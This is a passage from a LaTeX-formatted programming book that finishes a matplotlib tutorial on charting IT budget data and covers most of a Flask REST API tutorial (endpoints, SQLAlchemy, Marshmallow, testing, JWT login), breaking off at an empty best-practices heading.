\NormalTok{plt.bar(budget\_2022.index, budget\_2022.values)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Category\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\SpecialStringTok{f\textquotesingle{}IT Budget Distribution for }\SpecialCharTok{\{}\NormalTok{year}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Pie Chart}\label{pie-chart}

A pie chart shows the proportional distribution of the IT budget across
different categories.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{8}\NormalTok{, }\DecValTok{8}\NormalTok{))}
\NormalTok{plt.pie(budget\_2022.values, labels}\OperatorTok{=}\NormalTok{budget\_2022.index, autopct}\OperatorTok{=}\StringTok{\textquotesingle{}}\SpecialCharTok{\%1.1f\%\%}\StringTok{\textquotesingle{}}\NormalTok{, startangle}\OperatorTok{=}\DecValTok{140}\NormalTok{)}

\NormalTok{plt.title(}\SpecialStringTok{f\textquotesingle{}IT Budget Distribution for }\SpecialCharTok{\{}\NormalTok{year}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\section{Advanced Visualizations}\label{advanced-visualizations}

\subsection{Stacked Bar Chart}\label{stacked-bar-chart}

A stacked bar chart can show the composition of the IT budget over the
years.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{12}\NormalTok{, }\DecValTok{8}\NormalTok{))}
\NormalTok{plt.bar(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.bar(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{], bottom}\OperatorTok{=}\NormalTok{data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.bar(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{], bottom}\OperatorTok{=}\NormalTok{data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{] }\OperatorTok{+}\NormalTok{ data[}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.bar(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Personnel\textquotesingle{}}\NormalTok{], bottom}\OperatorTok{=}\NormalTok{data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{] }\OperatorTok{+}\NormalTok{ data[}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{] }\OperatorTok{+}\NormalTok{ data[}\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Personnel\textquotesingle{}}\NormalTok{)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}Stacked IT Budget Over Years\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.legend()}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Box Plot}\label{box-plot}

A box plot can show the distribution and outliers in the budget data for
different categories.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{12}\NormalTok{, }\DecValTok{8}\NormalTok{))}
\NormalTok{data.boxplot(column}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Personnel\textquotesingle{}}\NormalTok{])}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Category\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}IT Budget Distribution by Category\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Heatmap}\label{heatmap}

A heatmap can show the correlation between different budget categories.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ seaborn }\ImportTok{as}\NormalTok{ sns}

\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{8}\NormalTok{))}
\NormalTok{sns.heatmap(data.corr(), annot}\OperatorTok{=}\VariableTok{True}\NormalTok{, cmap}\OperatorTok{=}\StringTok{\textquotesingle{}coolwarm\textquotesingle{}}\NormalTok{, linewidths}\OperatorTok{=}\FloatTok{0.5}\NormalTok{)}

\NormalTok{plt.title(}\StringTok{\textquotesingle{}Correlation Heatmap of IT Budget Categories\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\section{Customizing Plots}\label{customizing-plots}

\subsection{Titles and Labels}\label{titles-and-labels}

Customizing titles and labels is crucial for making the plot more
informative.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{, fontsize}\OperatorTok{=}\DecValTok{14}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{, fontsize}\OperatorTok{=}\DecValTok{14}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}Hardware Budget Over Years\textquotesingle{}}\NormalTok{, fontsize}\OperatorTok{=}\DecValTok{16}\NormalTok{)}
\NormalTok{plt.legend(fontsize}\OperatorTok{=}\DecValTok{12}\NormalTok{)}
\NormalTok{plt.grid(}\VariableTok{True}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Legends}\label{legends}

Legends help in identifying different data series in a plot.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}IT Budget Over Years\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.legend(loc}\OperatorTok{=}\StringTok{\textquotesingle{}upper left\textquotesingle{}}\NormalTok{, fontsize}\OperatorTok{=}\DecValTok{12}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Annotations}\label{annotations}

Annotations can highlight specific data points in a plot.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Annotate a specific point}
\NormalTok{max\_year }\OperatorTok{=}\NormalTok{ data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{][data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{].idxmax()]}
\NormalTok{max\_value }\OperatorTok{=}\NormalTok{ data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{].}\BuiltInTok{max}\NormalTok{()}
\NormalTok{plt.annotate(}\SpecialStringTok{f\textquotesingle{}Max: }\SpecialCharTok{\{}\NormalTok{max\_value}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{, xy}\OperatorTok{=}\NormalTok{(max\_year, max\_value), xytext}\OperatorTok{=}\NormalTok{(max\_year}\OperatorTok{+}\FloatTok{0.5}\NormalTok{, max\_value}\OperatorTok{{-}}\DecValTok{5000}\NormalTok{),}
\NormalTok{             arrowprops}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(facecolor}\OperatorTok{=}\StringTok{\textquotesingle{}black\textquotesingle{}}\NormalTok{, shrink}\OperatorTok{=}\FloatTok{0.05}\NormalTok{))}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}Hardware Budget Over Years\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.legend()}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\section{Saving Plots}\label{saving-plots}

You can save the plots to files using the \texttt{savefig} method.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}Hardware Budget Over Years\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.legend()}

\NormalTok{plt.savefig(}\StringTok{\textquotesingle{}hardware\_budget\_over\_years.png\textquotesingle{}}\NormalTok{, dpi}\OperatorTok{=}\DecValTok{300}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-53}

This tutorial provided a deep dive into the \texttt{matplotlib} library
for visualizing IT budget data. We covered basic plotting techniques,
advanced visualizations, and customization options. By leveraging the
powerful capabilities of \texttt{matplotlib}, you can create insightful
and informative visualizations for various types of data.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial for Developing RESTful APIs with
Flask}\label{deep-dive-tutorial-for-developing-restful-apis-with-flask}

Flask is a lightweight WSGI web application framework in Python. It's
designed with simplicity and flexibility in mind, making it a popular
choice for developing RESTful APIs. This tutorial will provide a
comprehensive guide on how to develop RESTful APIs using Flask.

\section{Table of Contents}\label{table-of-contents-24}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-flask]{Introduction to Flask}
\item
  \hyperref[setting-up-your-environment]{Setting Up Your Environment}
\item
  \hyperref[creating-a-basic-flask-application]{Creating a Basic Flask
  Application}
\item
  \hyperref[understanding-restful-apis]{Understanding RESTful APIs}
\item
  \hyperref[creating-restful-endpoints]{Creating RESTful Endpoints}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[get-endpoint]{GET Endpoint}
  \item
    \hyperref[post-endpoint]{POST Endpoint}
  \item
    \hyperref[put-endpoint]{PUT Endpoint}
  \item
    \hyperref[delete-endpoint]{DELETE Endpoint}
  \end{itemize}
\item
  \hyperref[handling-data-with-flask]{Handling Data with Flask}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[using-flask-sqlalchemy]{Using Flask-SQLAlchemy}
  \item
    \hyperref[using-marshmallow-for-serialization]{Using Marshmallow for
    Serialization}
  \end{itemize}
\item
  \hyperref[error-handling]{Error Handling}
\item
  \hyperref[testing-your-api]{Testing Your API}
\item
  \hyperref[authentication-and-authorization]{Authentication and
  Authorization}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Flask}\label{introduction-to-flask}

Flask is a micro-framework for Python based on Werkzeug and Jinja2. It's
called a micro-framework because it doesn't require particular tools or
libraries. Flask has become a popular choice for developing APIs due to
its simplicity and extensibility.

\section{Setting Up Your
Environment}\label{setting-up-your-environment-1}

Before starting, ensure you have Python installed on your system. You
can download it from \href{https://www.python.org/}{python.org}.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Create a virtual environment:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python} \AttributeTok{{-}m}\NormalTok{ venv venv}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Activate the virtual environment:}

  \begin{itemize}
  \item
    On Windows:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{venv\textbackslash{}Scripts\textbackslash{}activate}
\end{Highlighting}
\end{Shaded}
  \item
    On macOS/Linux:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{source}\NormalTok{ venv/bin/activate}
\end{Highlighting}
\end{Shaded}
  \end{itemize}
\item
  \textbf{Install Flask:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install Flask}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Creating a Basic Flask
Application}\label{creating-a-basic-flask-application}

Create a new file named \texttt{app.py} and add the following code to
create a basic Flask application:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ flask }\ImportTok{import}\NormalTok{ Flask}

\NormalTok{app }\OperatorTok{=}\NormalTok{ Flask(}\VariableTok{\_\_name\_\_}\NormalTok{)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/\textquotesingle{}}\NormalTok{)}
\KeywordTok{def}\NormalTok{ hello\_world():}
    \ControlFlowTok{return} \StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    app.run(debug}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Run your application with:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python}\NormalTok{ app.py}
\end{Highlighting}
\end{Shaded}

You should see ``Hello, World!'' when you navigate to
\texttt{http://127.0.0.1:5000/}.

\section{Understanding RESTful APIs}\label{understanding-restful-apis}

REST (Representational State Transfer) is an architectural style for
designing networked applications. A RESTful API is an API that adheres
to the principles of REST. Key principles include:

\begin{itemize}
\tightlist
\item
  \textbf{Statelessness}: Each request from a client to a server must
  contain all the information needed to understand and process the
  request.
\item
  \textbf{Client-Server Architecture}: The client and server are
  independent of each other.
\item
  \textbf{Uniform Interface}: Resources are identified in the request,
  and the method (GET, POST, PUT, DELETE) dictates the action.
\end{itemize}

\section{Creating RESTful Endpoints}\label{creating-restful-endpoints}

\subsection{GET Endpoint}\label{get-endpoint}

The GET method retrieves information from the server.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ get\_items():}
\NormalTok{    items }\OperatorTok{=}\NormalTok{ [\{}\StringTok{"id"}\NormalTok{: }\DecValTok{1}\NormalTok{, }\StringTok{"name"}\NormalTok{: }\StringTok{"Item 1"}\NormalTok{\}, \{}\StringTok{"id"}\NormalTok{: }\DecValTok{2}\NormalTok{, }\StringTok{"name"}\NormalTok{: }\StringTok{"Item 2"}\NormalTok{\}]}
    \ControlFlowTok{return}\NormalTok{ jsonify(items)}
\end{Highlighting}
\end{Shaded}

\subsection{POST Endpoint}\label{post-endpoint}

The POST method sends data to the server to create a new resource.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}POST\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ create\_item():}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ request.get\_json()}
\NormalTok{    new\_item }\OperatorTok{=}\NormalTok{ \{}\StringTok{"id"}\NormalTok{: }\DecValTok{3}\NormalTok{, }\StringTok{"name"}\NormalTok{: data[}\StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{]\}}
    \ControlFlowTok{return}\NormalTok{ jsonify(new\_item), }\DecValTok{201}
\end{Highlighting}
\end{Shaded}

\subsection{PUT Endpoint}\label{put-endpoint}

The PUT method updates an existing resource.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items/\textless{}int:item\_id\textgreater{}\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}PUT\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ update\_item(item\_id):}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ request.get\_json()}
\NormalTok{    updated\_item }\OperatorTok{=}\NormalTok{ \{}\StringTok{"id"}\NormalTok{: item\_id, }\StringTok{"name"}\NormalTok{: data[}\StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{]\}}
    \ControlFlowTok{return}\NormalTok{ jsonify(updated\_item)}
\end{Highlighting}
\end{Shaded}

\subsection{DELETE Endpoint}\label{delete-endpoint}

The DELETE method removes a resource from the server.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items/\textless{}int:item\_id\textgreater{}\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}DELETE\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ delete\_item(item\_id):}
    \ControlFlowTok{return} \StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{, }\DecValTok{204}
\end{Highlighting}
\end{Shaded}

\section{Handling Data with Flask}\label{handling-data-with-flask}

\subsection{Using Flask-SQLAlchemy}\label{using-flask-sqlalchemy}

Flask-SQLAlchemy simplifies the integration between Flask and
SQLAlchemy, an ORM library for Python.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Install Flask-SQLAlchemy:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install Flask{-}SQLAlchemy}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Set up SQLAlchemy in your Flask application:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ flask }\ImportTok{import}\NormalTok{ Flask, request, jsonify}
\ImportTok{from}\NormalTok{ flask\_sqlalchemy }\ImportTok{import}\NormalTok{ SQLAlchemy}

\NormalTok{app }\OperatorTok{=}\NormalTok{ Flask(}\VariableTok{\_\_name\_\_}\NormalTok{)}
\NormalTok{app.config[}\StringTok{\textquotesingle{}SQLALCHEMY\_DATABASE\_URI\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}sqlite:///data.db\textquotesingle{}}
\NormalTok{db }\OperatorTok{=}\NormalTok{ SQLAlchemy(app)}

\KeywordTok{class}\NormalTok{ Item(db.Model):}
    \BuiltInTok{id} \OperatorTok{=}\NormalTok{ db.Column(db.Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    name }\OperatorTok{=}\NormalTok{ db.Column(db.String(}\DecValTok{80}\NormalTok{), nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{)}

\NormalTok{db.create\_all()}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ get\_items():}
\NormalTok{    items }\OperatorTok{=}\NormalTok{ Item.query.}\BuiltInTok{all}\NormalTok{()}
    \ControlFlowTok{return}\NormalTok{ jsonify([\{}\StringTok{"id"}\NormalTok{: item.}\BuiltInTok{id}\NormalTok{, }\StringTok{"name"}\NormalTok{: item.name\} }\ControlFlowTok{for}\NormalTok{ item }\KeywordTok{in}\NormalTok{ items])}

\CommentTok{\# Other routes here...}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    app.run(debug}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Using Marshmallow for
Serialization}\label{using-marshmallow-for-serialization}

Marshmallow is an object serialization/deserialization library.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Install Marshmallow and Flask-Marshmallow:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install marshmallow flask{-}marshmallow}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Set up Marshmallow in your Flask application:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ flask\_marshmallow }\ImportTok{import}\NormalTok{ Marshmallow}

\NormalTok{ma }\OperatorTok{=}\NormalTok{ Marshmallow(app)}

\KeywordTok{class}\NormalTok{ ItemSchema(ma.SQLAlchemyAutoSchema):}
    \KeywordTok{class}\NormalTok{ Meta:}
\NormalTok{        model }\OperatorTok{=}\NormalTok{ Item}

\NormalTok{item\_schema }\OperatorTok{=}\NormalTok{ ItemSchema()}
\NormalTok{items\_schema }\OperatorTok{=}\NormalTok{ ItemSchema(many}\OperatorTok{=}\VariableTok{True}\NormalTok{)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/items\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ get\_items():}
\NormalTok{    items }\OperatorTok{=}\NormalTok{ Item.query.}\BuiltInTok{all}\NormalTok{()}
    \ControlFlowTok{return}\NormalTok{ items\_schema.jsonify(items)}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Error Handling}\label{error-handling-5}

To handle errors gracefully, Flask provides an error handler decorator.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@app.errorhandler}\NormalTok{(}\DecValTok{404}\NormalTok{)}
\KeywordTok{def}\NormalTok{ resource\_not\_found(e):}
    \ControlFlowTok{return}\NormalTok{ jsonify(error}\OperatorTok{=}\BuiltInTok{str}\NormalTok{(e)), }\DecValTok{404}

\AttributeTok{@app.errorhandler}\NormalTok{(}\DecValTok{400}\NormalTok{)}
\KeywordTok{def}\NormalTok{ bad\_request(e):}
    \ControlFlowTok{return}\NormalTok{ jsonify(error}\OperatorTok{=}\BuiltInTok{str}\NormalTok{(e)), }\DecValTok{400}
\end{Highlighting}
\end{Shaded}

\section{Testing Your API}\label{testing-your-api}

Use the \texttt{unittest} module to write tests for your API.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Install Flask-Testing:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install Flask{-}Testing}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Create a test file \texttt{test\_app.py}:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}
\ImportTok{from}\NormalTok{ app }\ImportTok{import}\NormalTok{ app, db, Item}

\KeywordTok{class}\NormalTok{ BasicTests(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ setUp(}\VariableTok{self}\NormalTok{):}
\NormalTok{        app.config[}\StringTok{\textquotesingle{}TESTING\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \VariableTok{True}
\NormalTok{        app.config[}\StringTok{\textquotesingle{}SQLALCHEMY\_DATABASE\_URI\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}sqlite:///:memory:\textquotesingle{}}
        \VariableTok{self}\NormalTok{.app }\OperatorTok{=}\NormalTok{ app.test\_client()}
\NormalTok{        db.create\_all()}

    \KeywordTok{def}\NormalTok{ tearDown(}\VariableTok{self}\NormalTok{):}
\NormalTok{        db.session.remove()}
\NormalTok{        db.drop\_all()}

    \KeywordTok{def}\NormalTok{ test\_items(}\VariableTok{self}\NormalTok{):}
\NormalTok{        response }\OperatorTok{=} \VariableTok{self}\NormalTok{.app.get(}\StringTok{\textquotesingle{}/items\textquotesingle{}}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertEqual(response.status\_code, }\DecValTok{200}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Authentication and
Authorization}\label{authentication-and-authorization}

Flask-JWT-Extended is a popular extension for adding JSON Web Tokens
(JWT) to your Flask application.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Install Flask-JWT-Extended:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install Flask{-}JWT{-}Extended}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Set up JWT in your application:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ flask\_jwt\_extended }\ImportTok{import}\NormalTok{ JWTManager, create\_access\_token, jwt\_required}

\NormalTok{app.config[}\StringTok{\textquotesingle{}JWT\_SECRET\_KEY\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}your\_jwt\_secret\_key\textquotesingle{}}
\NormalTok{jwt }\OperatorTok{=}\NormalTok{ JWTManager(app)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/login\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}POST\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ login():}
\NormalTok{    username }\OperatorTok{=}\NormalTok{ request.json.get(}\StringTok{\textquotesingle{}username\textquotesingle{}}\NormalTok{, }\VariableTok{None}\NormalTok{)}
\NormalTok{    password }\OperatorTok{=}\NormalTok{ request.json.get(}\StringTok{\textquotesingle{}password\textquotesingle{}}\NormalTok{, }\VariableTok{None}\NormalTok{)}
    \ControlFlowTok{if}\NormalTok{ username }\OperatorTok{!=} \StringTok{\textquotesingle{}test\textquotesingle{}} \KeywordTok{or}\NormalTok{ password }\OperatorTok{!=} \StringTok{\textquotesingle{}test\textquotesingle{}}\NormalTok{:}
        \ControlFlowTok{return}\NormalTok{ jsonify(\{}\StringTok{"msg"}\NormalTok{: }\StringTok{"Bad username or password"}\NormalTok{\}), }\DecValTok{401}
\NormalTok{    access\_token }\OperatorTok{=}\NormalTok{ create\_access\_token(identity}\OperatorTok{=}\NormalTok{username)}
    \ControlFlowTok{return}\NormalTok{ jsonify(access\_token}\OperatorTok{=}\NormalTok{access\_token)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/protected\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\AttributeTok{@jwt\_required}\NormalTok{()}
\KeywordTok{def}\NormalTok{ protected():}
    \ControlFlowTok{return}\NormalTok{ jsonify(logged\_in\_as}\OperatorTok{=}\NormalTok{current\_user), }\DecValTok{200}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Best Practices}\label{best-practices-11}

